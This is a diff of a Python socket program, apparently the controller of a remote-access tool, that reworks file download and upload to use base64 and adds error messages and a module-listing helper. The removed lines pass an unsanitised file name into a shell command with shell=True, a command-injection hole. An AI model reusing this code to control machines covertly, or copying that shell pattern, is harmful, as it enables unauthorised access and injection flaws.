@@ -9,7 +9,7 @@ import socket
 import os,requests
 import threading,platform
 import subprocess
-import sys
+import sys,base64
 import signal,time
 import readline
 
@@ -475,23 +475,30 @@ def send(c):
 def get_files(connection,src_file,dst_file):
     try:
         print('\n[-] Downloading the file...')
-        connection.send(bytes('get_files', 'UTF'))
+        time.sleep(0.5)
+        connection.send(bytes('get_files', 'UTF-8'))
         time.sleep(1)
         connection.send(bytes(src_file,'UTF-8'))
-        lines = b''
+        file_exist = connection.recv(100).decode()
+        lines = ''
 
-        while lines[-3:] != b"EOF":
-            lines += connection.recv(90240000)
 
-        if str(lines.decode()) == 'Failed':
-            print(red + '[!] Unable to download the specified file')
-        else:
+        if file_exist.strip() == 'True':
+            while lines[-3:] != "EOF":
+
+                lines += connection.recv(90240000).decode()
+
             with open(dst_file,'wb') as f:
-                f.write(lines[:-3])
+                f.write(base64.b64decode(lines[:-3]))
+
             print(white + '[-] File saved as ' + dst_file + '\n')
 
+        else:
+            print(red + f'[!] Source file not found : {src_file}\n')
+
+
     except Exception as e:
-        pass
+        print(red + '[!] ERROR :',e,'\n')
 
 
 def send_files(connection,src_file,dst_file):
@@ -503,17 +510,12 @@ def send_files(connection,src_file,dst_file):
 
         r = ""
         if os.path.isfile(src_file):
-            OS = platform.uname().system
+            with open(src_file, 'rb') as f:
+                lines = f.read()
 
-            if OS == 'Linux':
-                r = 'cat'
-
-            elif OS == 'Windows':
-                r = 'type'
-            
-            lines = subprocess.run(f'{r} {src_file.strip()}',text=True,capture_output=True,shell=True)
-
-            connection.send(bytes(lines.stdout,'UTF-8'))
+            lines_64 = base64.encodebytes(lines).decode('utf-8')
+            time.sleep(1.5)
+            connection.send(bytes(lines_64,'UTF-8'))
             connection.send(bytes('EOF', 'UTF-8'))
             result = connection.recv(100000).decode()
         
@@ -524,18 +526,17 @@ def send_files(connection,src_file,dst_file):
                 print(result)
 
         else:
-            print(red + '[!] ERROR: FileNotFoundError')
+            print(red + f'[!] ERROR: FileNotFoundError : {src_file}\n')
 
     except Exception as e:
-        pass
+        print(red + '[!] ERROR :',e,'\n')
     
+
 def module_show(connection):
     print('\n[=] Searching loaded modules...')
     for module in MODULE_LIST:
         if module_check(connection, module):
             print(f'[+] "{module.strip()}" module found.')
-
-
 
 
 def module_search(module):
